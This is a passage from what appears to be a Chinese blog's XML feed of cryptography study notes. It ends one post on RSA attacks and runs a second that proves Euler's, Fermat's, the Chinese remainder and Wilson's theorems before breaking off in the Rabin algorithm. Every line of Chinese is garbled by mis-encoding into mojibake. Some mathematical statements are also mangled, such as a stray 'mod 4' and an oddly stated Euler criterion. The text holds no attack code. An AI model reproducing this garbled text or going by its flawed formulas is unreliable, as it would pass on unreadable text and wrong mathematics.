å¤§æ¦‚äº†è§£äº†</p><p>Further Attacks on Server-Aided RSA Cryptosystemsï¼Œ</p><p>Pollardâ€™s Ï algorithmï¼Œ</p><p>ä»¥åŠå¤šç´ æ•°RSAç³»ç»Ÿçš„å…¶ä¸­ä¸€ç§è§£æ³•ï¼Œ</p><p>æœ€åï¼Œæ„Ÿè°¢Lurå¤§ä½¬çš„æŒ‡ç‚¹~</p><p><del>ä½†è™½ç„¶çŸ¥é“è¿™ä¸ªç®—æ³•çš„æµç¨‹ï¼Œå…¶å®å¹¶ä¸æ‡‚åŸç†ï¼Œå¥½ç¥å¥‡çš„æ„Ÿè§‰ï¼Œæœ‰æ²¡æœ‰å¤§ä½¬æ•™æ•™ä¿º</del></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://en.wikipedia.org/wiki/Pollard's_kangaroo_algorithm" target="_blank" rel="noopener">Pollardâ€™s rho algorithm</a></p><p><a href="http://www.hghhgghhg.top/2019/10/28/UNCTFWP/#simple-rsa" target="_blank" rel="noopener">UNCTF-simple-rsa Write-Up</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Rsa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ æ•°è®ºå››å¤§å®šç†åŠåº”ç”¨</title>
      <link href="/2019/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%9B%9B%E5%A4%A7%E5%AE%9A%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2019/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%9B%9B%E5%A4%A7%E5%AE%9A%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/194137" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¯ä»¥å‘ç°RSAä¸­çš„å¾ˆå¤šæ”»å‡»æ–¹æ³•éƒ½æ˜¯ä»æ•°è®ºå››å¤§å®šç†æ¨å¯¼å‡ºçš„ï¼Œæ‰€ä»¥æ‰¾æ—¶é—´å¥½å¥½å­¦ä¹ äº†ä¸€ä¸‹æ•°è®ºå››å¤§å®šç†çš„è¯æ˜åŠå…¶åº”ç”¨åœºæ™¯â€”â€”Rabinç®—æ³•ã€‚</p><h2 id="æ¬§æ‹‰å®šç†"><a href="#æ¬§æ‹‰å®šç†" class="headerlink" title="æ¬§æ‹‰å®šç†"></a>æ¬§æ‹‰å®šç†</h2><p>è‹¥$n,a$ä¸ºæ­£æ•´æ•°ï¼Œä¸”$n,a$äº’ç´ ï¼Œå³$gcd(a,n) = 1$ï¼Œåˆ™</p><p>$a^{Ï†(n)}\equiv1\pmod{n}$</p><h3 id="è¯æ˜"><a href="#è¯æ˜" class="headerlink" title="è¯æ˜"></a>è¯æ˜</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“æ¬§æ‹‰å®šç†æ˜¯ä»€ä¹ˆï¼š</p><p> æ•°è®ºä¸Šçš„æ¬§æ‹‰å®šç†ï¼ŒæŒ‡çš„æ˜¯</p><p>$a^{Ï†(n)}\equiv1\pmod{n}$</p><p>è¿™ä¸ªå¼å­å®åœ¨$a$å’Œ$n$äº’è´¨çš„å‰æä¸‹æˆç«‹çš„ã€‚</p><p>è¯æ˜</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬çŸ¥é“åœ¨1åˆ°$n$çš„æ•°ä¸­ï¼Œä¸näº’è´¨çš„ä¸€å…±æœ‰$Ï†(n$)ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠè¿™$Ï†(n)$ä¸ªæ•°æ‹¿å‡ºæ¥ï¼Œæ”¾åˆ°è®¾å‡ºçš„é›†åˆXä¸­ï¼Œå³ä¸º$x_1,x_2â€¦â€¦x_{Ï†(n)}$</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥å†è®¾å‡ºä¸€ä¸ªé›†åˆä¸ºMï¼Œè®¾Mä¸­çš„æ•°ä¸ºï¼š</p><p>$m_1=aâˆ—x_1,m_2=aâˆ—x_2â€¦â€¦m_Ï†(n)=aâˆ—x_{Ï†(n)}$</p><p>ä¸‹é¢æˆ‘ä»¬è¯æ˜ä¸¤ä¸ªæ¨ç†ï¼š</p><h4 id="ä¸€ã€Mä¸­ä»»æ„ä¸¤ä¸ªæ•°éƒ½ä¸æ¨¡nåŒä½™ã€‚"><a href="#ä¸€ã€Mä¸­ä»»æ„ä¸¤ä¸ªæ•°éƒ½ä¸æ¨¡nåŒä½™ã€‚" class="headerlink" title="ä¸€ã€Mä¸­ä»»æ„ä¸¤ä¸ªæ•°éƒ½ä¸æ¨¡nåŒä½™ã€‚"></a>ä¸€ã€Mä¸­ä»»æ„ä¸¤ä¸ªæ•°éƒ½ä¸æ¨¡nåŒä½™ã€‚</h4><p>åè¯æ³•ã€‚</p><p>è¯æ˜ï¼šå‡è®¾Mä¸­å­˜åœ¨ä¸¤ä¸ªæ•°è®¾ä¸º$m_a,m_b$æ¨¡$n$åŒä½™ã€‚</p><p> å³$m_a\equiv m_b$</p><p> ç§»é¡¹å¾—åˆ°ï¼š$m_aâˆ’m_b=nâˆ—k$</p><p> å†å°†mç”¨xæ¥è¡¨ç¤ºå¾—åˆ°ï¼š$aâˆ—x_aâˆ’aâˆ—x_b=nâˆ—k$</p><p> æå–å…¬å› å¼å¾—åˆ°ï¼š$aâˆ—(x_aâˆ’x_b)=nâˆ—k$</p><p> æˆ‘ä»¬ç°åœ¨å·²çŸ¥$a$ä¸$n$äº’è´¨ï¼Œé‚£ä¹ˆå¼å­å°±å¯ä»¥è½¬åŒ–ä¸ºï¼š</p><p>$x_aâˆ’x_b\equiv 0 \pmod{n}$</p><p>å› ä¸º$a$ä¸­æ²¡æœ‰ä¸$n$çš„å…¬å› å­ï¼ˆ1é™¤å¤–ï¼‰æ‰€ä»¥$a !\equiv  0 \pmod{n}$ æ‰€æœ‰åªèƒ½æ˜¯$ x_aâˆ’x_b\equiv 0\pmod{n}$ã€‚</p><p> åˆå› ä¸º$x_a,x_b$éƒ½æ˜¯å°äº$n$çš„å¹¶ä¸”ä¸ä¼šç›¸åŒï¼Œé‚£ä¹ˆä¸Šè¿°çš„å¼å­è‡ªç„¶å…¨éƒ½ä¸æˆç«‹ã€‚</p><p> å‡è®¾ä¸æˆç«‹ã€‚</p><p>è¯å¾—ï¼š$M$ä¸­ä»»æ„ä¸¤ä¸ªæ•°éƒ½ä¸æ¨¡$4$åŒä½™ã€‚</p><h4 id="äºŒã€Mä¸­çš„æ•°é™¤ä»¥nçš„ä½™æ•°å…¨éƒ¨ä¸näº’è´¨ã€‚"><a href="#äºŒã€Mä¸­çš„æ•°é™¤ä»¥nçš„ä½™æ•°å…¨éƒ¨ä¸näº’è´¨ã€‚" class="headerlink" title="äºŒã€Mä¸­çš„æ•°é™¤ä»¥nçš„ä½™æ•°å…¨éƒ¨ä¸näº’è´¨ã€‚"></a>äºŒã€Mä¸­çš„æ•°é™¤ä»¥nçš„ä½™æ•°å…¨éƒ¨ä¸näº’è´¨ã€‚</h4><p>è¯æ˜ï¼šæˆ‘ä»¬å·²çŸ¥$m_i=aâˆ—x_i$</p><p> åˆå› ä¸º$a$ä¸$n$äº’è´¨ï¼Œ$x_i$ä¸$n$äº’è´¨ï¼Œæ‰€ä»¥å¯å¾—$m_i$ä¸$n$äº’è´¨ã€‚</p><p> å¸¦å…¥åˆ°æ¬§å‡ é‡Œå¾—ç®—æ³•ä¸­æ¨ä¸€æ­¥å°±å¥½äº†ã€‚</p><p> å³ï¼š</p><p>$gcd(aâˆ—xi,n)=gcd(mi,n)=gcd(n,mi mod n)=1$</p><p>è¯æ¯•ã€‚</p><h4 id="ä¸‰ã€æ ¹æ®æˆ‘ä»¬è¯å¾—çš„ä¸¤ä¸ªæ€§è´¨ï¼Œå°±å¯ä»¥å¼€å§‹æ¨å¼å­äº†ã€‚"><a href="#ä¸‰ã€æ ¹æ®æˆ‘ä»¬è¯å¾—çš„ä¸¤ä¸ªæ€§è´¨ï¼Œå°±å¯ä»¥å¼€å§‹æ¨å¼å­äº†ã€‚" class="headerlink" title="ä¸‰ã€æ ¹æ®æˆ‘ä»¬è¯å¾—çš„ä¸¤ä¸ªæ€§è´¨ï¼Œå°±å¯ä»¥å¼€å§‹æ¨å¼å­äº†ã€‚"></a>ä¸‰ã€æ ¹æ®æˆ‘ä»¬è¯å¾—çš„ä¸¤ä¸ªæ€§è´¨ï¼Œå°±å¯ä»¥å¼€å§‹æ¨å¼å­äº†ã€‚</h4><p>é¦–å…ˆï¼Œæ ¹æ®å‰ä¸¤ä¸ªæ¨è®ºå¯ä»¥çŸ¥é“ï¼Œ$M$ä¸­çš„æ•°åˆ†åˆ«å¯¹åº”$X$ä¸­çš„æ¯ä¸ªæ•°æ¨¡$n$åŒä½™ã€‚</p><p>ï¼ˆå³æ˜¯åŒå°„å…³ç³»ï¼šé¦–å…ˆMä¸­çš„æ•°åœ¨æ¨¡nä¸‹ä¸åŒä½™ï¼Œå³ä¸ç›¸åŒï¼Œç„¶åæœ‰$Ï†(n)$ä¸ª$m$ï¼›å…¶æ¬¡æœ‰$Ï†(n)$ä¸ªä¸ç›¸åŒçš„$x$ä¸$n$äº’è´¨ï¼Œæ‰€ä»¥$m$ä¸$x$æ˜¯åŒå°„å…³ç³»ï¼‰</p><p>æ‰€ä»¥å¯ä»¥å¾—åˆ°ï¼š</p><p>$m_1âˆ—m_2âˆ—â€¦â€¦âˆ—m_{Ï†(n)}\equiv x_1âˆ—x_2âˆ—â€¦â€¦âˆ—x_{Ï†(n)}\pmod{n}$</p><p>ç°åœ¨æˆ‘ä»¬æŠŠæ›¿æ¢æˆxçš„å½¢å¼ï¼Œå°±å¯ä»¥å¾—åˆ°ï¼š</p><p>$aâˆ—x_1âˆ—aâˆ—x_2âˆ—â€¦â€¦âˆ—aâˆ—x_{Ï†(n)}\equiv x_1âˆ—x_2âˆ—â€¦â€¦âˆ—x_{Ï†(n)}\pmod{n}$</p><p>$a^{Ï†(n)}âˆ—(x_1âˆ—x_2â€¦â€¦âˆ—x_{Ï†(n)})\equiv x_1âˆ—x_2â€¦â€¦âˆ—x_{Ï†(n)}\pmod{n}$</p><p>$(a^Ï†(n)âˆ’1)âˆ—(x_1âˆ—x_2â€¦â€¦âˆ—x_{Ï†(n)})\equiv 0\pmod{n}$</p><p>ç„¶åï¼Œç”±äº$(x_1âˆ—x_2â€¦â€¦âˆ—x_{Ï†(n)}) !\equiv 0\pmod{n}$</p><p>æ‰€ä»¥    $(a^{Ï†(n)}âˆ’1)\equiv 0\pmod{n}$</p><p>æ‰€ä»¥    $a^{Ï†(n)}\equiv 1\pmod{n}$</p><h3 id="åº”ç”¨ï¼šRSAçš„è§£å¯†"><a href="#åº”ç”¨ï¼šRSAçš„è§£å¯†" class="headerlink" title="åº”ç”¨ï¼šRSAçš„è§£å¯†"></a>åº”ç”¨ï¼šRSAçš„è§£å¯†</h3><p>æ¬§æ‹‰å®šç†åœ¨RSAä¸­å¯ç”¨äºè¯æ˜ $M\equiv C^d \pmod{N}$ ï¼š</p><p><img src="https://i.loli.net/2020/04/30/zmodaOUq2NSv6IP.png" alt="RSAè§£å¯†éªŒè¯"> </p><h2 id="è´¹é©¬å°å®šç†ï¼ˆæ¬§æ‹‰å®šç†ç‰¹æ®Šå‹æƒ…å†µï¼‰"><a href="#è´¹é©¬å°å®šç†ï¼ˆæ¬§æ‹‰å®šç†ç‰¹æ®Šå‹æƒ…å†µï¼‰" class="headerlink" title="è´¹é©¬å°å®šç†ï¼ˆæ¬§æ‹‰å®šç†ç‰¹æ®Šå‹æƒ…å†µï¼‰"></a>è´¹é©¬å°å®šç†ï¼ˆæ¬§æ‹‰å®šç†ç‰¹æ®Šå‹æƒ…å†µï¼‰</h2><p> å¯¹äºè´¨æ•°pï¼Œä»»æ„æ•´æ•°aï¼Œå‡æ»¡è¶³ï¼š$a^{p-1}\equiv 1 \pmod{p}$</p><p>é‚£ä¹ˆï¼Œ$a^{p-2}$å°±æ˜¯aåœ¨æ¨¡pä¸‹çš„é€†å…ƒäº†</p><h2 id="å­™å­å®šç†ï¼ˆä¸­å›½å‰©ä½™å®šç†-CRTï¼‰"><a href="#å­™å­å®šç†ï¼ˆä¸­å›½å‰©ä½™å®šç†-CRTï¼‰" class="headerlink" title="å­™å­å®šç†ï¼ˆä¸­å›½å‰©ä½™å®šç† CRTï¼‰"></a>å­™å­å®šç†ï¼ˆä¸­å›½å‰©ä½™å®šç† CRTï¼‰</h2><p>è®¾æ­£æ•´æ•°$m_1,m_2â€¦m_k$ä¸¤ä¸¤äº’ç´ ï¼Œåˆ™åŒä½™æ–¹ç¨‹ç»„<br>$x \equiv a_1 \pmod{m_1}$<br>$x \equiv a_2 \pmod{m_2}$<br>$x \equiv a_3 \pmod{m_3}$<br>â€¦<br>$x \equiv a_k \pmod{m_k}$</p><p>æœ‰æ•´æ•°è§£ã€‚å¹¶ä¸”åœ¨æ¨¡$M = m_1 \cdot m_2 \cdot â€¦ \cdot m_k$ä¸‹çš„è§£æ˜¯å”¯ä¸€çš„ï¼Œè§£ä¸º<br>$x \equiv (a_1M_1M_1^{-1} + a_2M_2M_2^{-1} + â€¦ + a_kM_kM_k^{-1}) \mod M$</p><p>å…¶ä¸­$M_i = M / m_i$ï¼Œè€Œ$M_i^{-1}$ä¸º$M_i$æ¨¡$m_i$çš„é€†å…ƒã€‚</p><h3 id="è¯æ˜-1"><a href="#è¯æ˜-1" class="headerlink" title="è¯æ˜"></a>è¯æ˜</h3><p>å…·ä½“è¯æ˜å¦‚ä¸‹ï¼š</p><p>ä¾‹ï¼šæ‰¾å‡ºæ‰€æœ‰æ•´æ•°x,ä½¿å…¶è¢«3ï¼Œ5å’Œ7é™¤æ—¶ï¼Œä½™æ•°åˆ†åˆ«ä¸º2ï¼Œ3å’Œ2</p><p>$x\equiv 2 \pmod{3}$</p><p>$x\equiv 3 \pmod{5}$</p><p>$x\equiv 2 \pmod{7}$</p><p>=&gt;      $x = â–³ + 3<em>5</em>7*t$  (â–³ä¸ºæœŸä¸­çš„ä¸€ä¸ªè§£ï¼Œtä¸ºæ•´æ•°ï¼‰</p><p>åœ¨åŒä½™ä¸­æœ€é‡è¦çš„è§‚å¿µå°±æ˜¯æ±‚å‡ºç¬¬ä¸€ä¸ªè§£ï¼Œé‚£ä¹ˆ$x = â–³ + 3<em>5</em>7*t$å°±æ˜¯é€šè§£ã€‚é‚£æ€ä¹ˆæ±‚ä¸€ä¸ªè§£å‘¢ï¼Ÿ</p><p>åˆ©ç”¨åŒä½™çš„åŠ æ€§ï¼š</p><p>æŠŠ$x$æ‹†æˆ$a+b+c$,å³$x = a + b + c            $</p><p>ä»¤</p><p>$a\equiv 2 \pmod{3}$</p><p>$a\equiv 0 \pmod{5}$</p><p>$a\equiv 0 \pmod{7}$</p><p>=&gt; $a=35p$ ( å¯ä»¥çœ‹åˆ°på–1çš„æ—¶å€™æ»¡è¶³$a\equiv 2\pmod{3}$,å³$a=35 $)</p><p><strong>ä¸ºä½•è¿™æ ·å–ï¼Ÿä»æ¥ä¸‹æ¥çš„å–æ³•å¯çŸ¥ï¼šb å’Œ c éƒ½ä¼šå– 3 çš„å€æ•°ï¼Œè¿™æ ·å­å°±èƒ½ä¿è¯ï¼Œx  mod 3 = 2ï¼Œæˆ‘ä»¬æ ‡è®°è¿™æ ·çš„å–æ³•ä¸ºFLAG</strong> </p><p>æ¥ä¸‹æ¥è¦æ±‚bï¼š</p><p>$b\equiv 0\pmod{3}$</p><p>$b\equiv 3\pmod{5}$</p><p>$b\equiv 0\pmod{7}$</p><p>=&gt;$b=21q$ (å¯ä»¥çœ‹åˆ°qå–3çš„æ—¶å€™æ»¡è¶³$b\equiv 3\pmod{5}$,å³$b=63$)</p><p>æ±‚c</p><p>$c\equiv 0\pmod{3}$</p><p>$c\equiv 0\pmod{5}$</p><p>$c\equiv 2\pmod{7}$</p><p>$=&gt;$$c=15m$(å¯ä»¥çœ‹åˆ°må–2çš„æ—¶å€™æ»¡è¶³$c\equiv 2\pmod{7}$,å³$c=30$)</p><p>å¾—</p><p>$x\equiv 2\pmod{3}  \equiv  a + b + c$</p><p>$x\equiv 3\pmod{5}  \equiv  a + b + c$</p><p>$x\equiv 2\pmod{7}  \equiv  a + b + c$</p><p>a  b  c éƒ½æ±‚å‡ºæ¥ä¹‹åï¼Œå¯ä»¥åˆ©ç”¨åŒä½™çš„åŠ æ€§ </p><p>$x = a + b + c = 128$æ˜¯ä¸€ä¸ªè§£ï¼Œ  $x = 128 + 105t $åœ¨é€‚å½“è°ƒæ•´$t$ä¹‹åå°±å¯ä»¥æ±‚å‡º$x$åœ¨ä»»ä½•èŒƒå›´å†…çš„è§£ï¼Œæ¯”å¦‚è¯´æ±‚æœ€å°æ­£æ•´æ•°è§£ï¼Œè¿™æ—¶å€™$t$å–$-1$ï¼Œå¾—$x=23$</p><p>åˆ©ç”¨åŒä½™çš„ä¹˜æ€§ï¼š</p><p>ä¹‹å‰ä»¤$x = a + b + c$,ç”¨åŒä½™çš„ä¹˜æ€§ä¹‹å$x = 2aâ€™ + 3bâ€™ + 2câ€™$    (æ­¤æ—¶ä»¤$aâ€™=bâ€™=câ€™=1$ï¼Œå°±ç›¸å½“äºåŒä½™çš„åŠ æ€§äº†)</p><p>$aâ€™\equiv 1\pmod{3} $</p><p>$aâ€™\equiv 0\pmod{5}$</p><p>$aâ€™\equiv 0\pmod{7}$</p><p>$ =&gt;aâ€™=35p$(å¯ä»¥çœ‹åˆ°på–2çš„æ—¶å€™æ»¡è¶³$aâ€™\equiv 1\pmod{3}$,å³$aâ€™=70$)</p><p>æ¥ä¸‹æ¥è¦æ±‚bâ€™ï¼š</p><p>$bâ€™\equiv 0\pmod{3}$</p><p>$bâ€™\equiv 1\pmod{5}$</p><p>$bâ€™\equiv 0\pmod{7}$</p><p>$=&gt;bâ€™=21q$(å¯ä»¥çœ‹åˆ°$q$å–1çš„æ—¶å€™æ»¡è¶³$bâ€™\equiv 1\pmod{5}$,å³$bâ€™=21$)</p><p>ç°åœ¨æ¥çœ‹câ€™</p><p>$câ€™\equiv 0\pmod{3}$</p><p>$câ€™\equiv 0\pmod{5} $</p><p>$câ€™\equiv 1\pmod{7}$</p><p>$=&gt;câ€™=15m$(å¯ä»¥çœ‹åˆ°må–1çš„æ—¶å€™æ»¡è¶³$câ€™\equiv 1\pmod{7}$,å³$câ€™=15$)</p><p>æœ‰äº†$aâ€™ bâ€™ câ€™$ä¹‹åå°±å¯ä»¥å¾—åˆ° $x = 2aâ€™ + 3bâ€™ + 2*câ€™ $<br>ä»£å…¥$aâ€™ bâ€™ câ€™$ä¹‹åå°±å¯ä»¥å¾—åˆ°$x$çš„ä¸€ä¸ªè§£åŠå…¶é€šè§£</p><p>$x = 2<em>70 + 3</em>21 +2*15 $</p><p>$x = 233 + 105t$</p><p>åœ¨çŸ¥é“åŒä½™çš„åŠ æ€§å’Œä¹˜æ€§ä¹‹åå†çœ‹ä¸‹é¢è¿™ä¸ªå…¬å¼å°±æ²¡æœ‰ä»€ä¹ˆé—®é¢˜äº†</p><p>$x \equiv (a_1M_1M_1^{-1} + a_2M_2M_2^{-1} + â€¦ + a_kM_kM_k^{-1}) \mod M$</p><p>å…¶ä¸­ï¼Œ$a_i$å°±æ˜¯é¢˜ç›®æ‰€è¦æ±‚çš„å‰©ä½™ï¼Œ$M_1$å°±æ˜¯å‰æ–‡æåˆ°çš„æ ‡è®°å–æ³•<strong>FLAG</strong>ï¼Œè€Œ$M_1^{-1}$å°±æ˜¯åœ¨åŒä½™çš„ä¹˜æ³•æ€§ä¸­ä¸ºäº†æ»¡è¶³$a_1â€™\equiv 1 \pmod{m_i}$</p><h2 id="å¨å°”é€Šå®šç†"><a href="#å¨å°”é€Šå®šç†" class="headerlink" title="å¨å°”é€Šå®šç†"></a>å¨å°”é€Šå®šç†</h2><p>å½“ä¸”ä»…å½“pä¸ºç´ æ•°æ—¶æœ‰ï¼Œ</p><p> <strong>$(pâˆ’1) ! \equiv  âˆ’1\pmod{p}$</strong></p><h3 id="è¯æ˜ï¼š"><a href="#è¯æ˜ï¼š" class="headerlink" title="è¯æ˜ï¼š"></a>è¯æ˜ï¼š</h3><p>é¦–å…ˆï¼š</p><p>$pâˆ’1 \equiv  âˆ’1\pmod{p}$</p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦è¯æ˜ $(pâˆ’2)!\equiv 1\pmod{p} $</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé™¤å» $1$ åï¼Œå¦‚æœ $2,3,â€¦,pâˆ’2$ èƒ½å¤Ÿä¸¤ä¸¤é…å¯¹ï¼Œä¸”æ¯å¯¹æ•°ä¹˜ç§¯æ¨¡ $p$ åä¸º $1$ çš„è¯ï¼Œå¨å°”é€Šå®šç†å°±æˆç«‹äº†ï¼Œç„¶åæˆ‘ä»¬è€ƒè™‘è¿™å…¶å®å°±æ˜¯å¯¹äº$ 2,3,â€¦,pâˆ’2$å»æ‰¾ æ¨¡ $p$ æ„ä¹‰ä¸‹çš„é€†å…ƒã€‚</p><p>ç„¶åè€ƒè™‘ä¸€ä¸‹äºŒæ¬¡å‰©ä½™é‡Œé¢çš„è¡ç”ŸçŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å¯¹äº $x^2\equiv 1\pmod{p}$åªæœ‰ä¸¤ä¸ªè§£$ï¼ˆ1ï¼Œp-1ï¼‰$ï¼Œè€Œè¿™ä¸¤ä¸ªæ•°å·²ç»è¢«æˆ‘ä»¬å®‰æ’æ‰äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ $2,3,â€¦,pâˆ’2$ä¸­ä¸å­˜åœ¨æŸä¸ªæ•°çš„é€†å…ƒæ˜¯è‡ªå·±æœ¬èº«ã€‚</p><p>ç„¶å é›†åˆ$ A={1,2,3,â€¦p -1}$;  æ„æˆæ¨¡pä¹˜æ³•çš„ç¼©ç³»ï¼Œå³ä»»æ„$iâˆˆA$ ,å­˜åœ¨$jâˆˆA$,ä½¿å¾—:     $( iï¼Œj ) \equiv  1\pmod{p}$</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé™¤å»$1$å’Œ$p-1$å¤–ï¼Œå…¶ä½™çš„ä¸¤ä¸¤é…å¯¹äº’ä¸ºé€†å…ƒ</p><p>è¯æ¯•</p><h2 id="åº”ç”¨ï¼šRabinç®—æ³•"><a href="#åº”ç”¨ï¼šRabinç®—æ³•" class="headerlink" title="åº”ç”¨ï¼šRabinç®—æ³•"></a>åº”ç”¨ï¼šRabinç®—æ³•</h2><p>åœ¨è§£Rabinç®—æ³•å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸€äº›å®šç†ã€æ¨è®º</p><h3 id="å®šç†1"><a href="#å®šç†1" class="headerlink" title="å®šç†1"></a>å®šç†1</h3><p>æ¬§æ‹‰åˆ¤åˆ«å®šç†ï¼Œ cæ˜¯æ¨¡pçš„å¹³æ–¹å‰©ä½™çš„å……è¦æ¡ä»¶æ˜¯ ï¼Œ$(c^\frac{1}{2})^{Ï†(n)}  \equiv  1\pmod{p}$</p><h4 id="è¯æ˜ï¼š-1"><a href="#è¯æ˜ï¼š-1" class="headerlink" title="è¯æ˜ï¼š"></a>è¯æ˜ï¼š</h4><p>é¦–å…ˆï¼Œç”±äº$p$æ˜¯ä¸€ä¸ªå¥‡ç´ æ•°ï¼Œç”±è´¹é©¬å°å®šç†ï¼Œ$d^{p-1} \equiv 1 \pmod{p}$ã€‚ä½†æ˜¯$P-1$æ˜¯ä¸€ä¸ªå¶æ•°ï¼Œæ‰€ä»¥æœ‰</p><p>$(d^{ \frac{p-1}{2} } -1) \cdot (d^{ \frac{p-1}{2} }+1) \equiv 0 \pmod{p}$</p><p>$p$ æ˜¯ä¸€ä¸ªç´ æ•°ï¼Œæ‰€ä»¥$d^{ \frac{p-1}{2} } -1$ å’Œ $d^{ \frac{p-1}{2} }+1$ä¸­å¿…æœ‰ä¸€ä¸ªæ˜¯$P$ çš„å€æ•°ã€‚å› æ­¤$d^{ \frac{p-1}{2} }$æ¨¡$P$çš„ä½™æ•°å¿…ç„¶æ˜¯1æˆ–-1ã€‚</p><ul><li>è¯æ˜è‹¥$d$æ˜¯æ¨¡$p$äºŒæ¬¡å‰©ä½™ï¼Œåˆ™$d^{ \frac{p-1}{2}} \equiv 1 \pmod{p}$</li></ul><p>è‹¥$d$æ˜¯æ¨¡$p$äºŒæ¬¡å‰©ä½™ï¼Œåˆ™å­˜åœ¨ $x^2 \equiv d \pmod{p}$ï¼Œ$p$è·Ÿ$d$å’Œ$x$ äº’è´¨ã€‚æ ¹æ®è´¹é©¬å°å®šç†å¾—ï¼š</p><p>$d^{ \frac{p-1}{2}} \equiv x^{p-1} \equiv 1 \pmod{p}$</p><ul><li>è¯æ˜è‹¥$d^{ \frac{p-1}{2} } \equiv 1 \pmod{p}$ï¼Œåˆ™$d$æ˜¯æ¨¡$p$çš„äºŒæ¬¡å‰©ä½™</li></ul><p>$p$ æ˜¯ä¸€ä¸ªå¥‡ç´ æ•°ï¼Œæ‰€ä»¥å…³äº$p$çš„åŸæ ¹å­˜åœ¨ã€‚è®¾$a$æ˜¯$p$çš„ä¸€ä¸ªåŸæ ¹ï¼Œåˆ™å­˜åœ¨$1 \le j \le p-1$ä½¿å¾—$d=a^j$ã€‚äºæ˜¯</p><p> $d^{ \frac{p-1}{2}} \equiv x^{p-1} \equiv 1 \pmod{p}$ </p><p>$a$æ˜¯$p$çš„ä¸€ä¸ªåŸæ ¹ï¼Œå› æ­¤$a$æ¨¡$p$çš„æŒ‡æ•°æ˜¯$p-1$ï¼Œäºæ˜¯$p-1$æ•´é™¤ $\frac{ j(p-1) }{2}$ ã€‚è¿™è¯´æ˜$j$æ˜¯ä¸€ä¸ªå¶æ•°ã€‚ä»¤ $i = \frac{j}{2}$ ï¼Œå°±æœ‰ $(a^i)^2 =a^{2i} = d$ ã€‚$d$æ˜¯æ¨¡$p$ çš„äºŒæ¬¡å‰©ä½™ </p><h3 id="å®šç†2"><a href="#å®šç†2" class="headerlink" title="å®šç†2"></a>å®šç†2</h3><p>äºŒæ¬¡åŒä½™å¼$x^2 \equiv  c \pmod{p}$çš„è§£ä¸ºï¼š</p><p>â€‹                                                $    x \equiv  Â±c^\frac{p+1}{4}  \pmod{p}    $</p><h4 id="è¯æ˜-2"><a href="#è¯æ˜-2" class="headerlink" title="è¯æ˜"></a>è¯æ˜</h4><p>ç”±äºpæ˜¯ç´ æ•°ï¼Œæ˜¾ç„¶aä¸päº’ç´ ï¼Œå†ç”±æ¬§æ‹‰åˆ¤åˆ«å®šç†ï¼Œ aæ˜¯æ¨¡pçš„å¹³æ–¹å‰©ä½™çš„å……è¦æ¡ä»¶æ˜¯ ï¼Œ</p><p>$(c^\frac{1}{2})^{Ï†(n)} \equiv  1\pmod{p}$</p><p>å³$(c^\frac{1}{2})^{p-1} \equiv  1\pmod{p}$</p><p>å¸¦å…¥åŸå¼ï¼Œå¾—$x^2 \equiv  cÂ·(c^\frac{1}{2})^{p-1} \equiv  c^\frac{p+1}{2} \equiv  (c^\frac{p+1}{4})^2$</p><p>åˆ™</p><p>$x \equiv  Â±c^\frac{p+1}{4}  \pmod{p}$</p><h3 id="å®šç†3"><a href="#å®šç†3" class="headerlink" title="å®šç†3"></a>å®šç†3</h3><p>å¦‚æœæ•´æ•°$c$æ»¡è¶³ï¼š</p><p>1ï¼‰ $c$ä¸º$p$çš„å¹³æ–¹å‰©ä½™</p><p>2ï¼‰ $c$ä¸º$q$çš„å¹³æ–¹å‰©ä½™</p><p>åˆ™ï¼š$ c$ä¸º$p*q$çš„å¹³æ–¹å‰©ä½™ï¼Œè§£$x$ä¸ºï¼š</p><p>$x\equivÂ±(c^\frac{p+1}{4}\pmod{p})\cdot(q^{-1}\pmod{p})\cdot q Â± (c^\frac{q+1}{4}\pmod{q})\cdot (p^{-1}\pmod{q})Â·p\pmod{p\cdot q}$</p><h4 id="è¯æ˜-3"><a href="#è¯æ˜-3" class="headerlink" title="è¯æ˜"></a>è¯æ˜</h4><p>äºŒæ¬¡åŒä½™å¼ï¼š    $x^2 \equiv  c\pmod{p*q}$</p><p>ç­‰ä»·äºåŒä½™å¼ç»„ ï¼š    $x^2 \equiv  c \pmod{p}$        â‘     </p><p>â€‹                                    $x^2 \equiv  c\pmod{q}$        â‘¡</p><p>ç”±å®šç†2</p><p>â‘ å¼è§£ä¸º    $x \equiv  Â±c^\frac{p+1}{4}  \pmod{p}    $</p><p>â‘¡å¼è§£ä¸º    $x \equiv  Â±c^\frac{q+1}{4}  \pmod{q}$</p><p>ç”±CRTï¼Œè§£ä¸º $x\equivÂ±(c^\frac{p+1}{4}\pmod{p})\cdot(q^{-1}\pmod{p})\cdot q Â± (c^\frac{q+1}{4}\pmod{q})\cdot (p^{-1}\pmod{q})Â·p\pmod{p\cdot 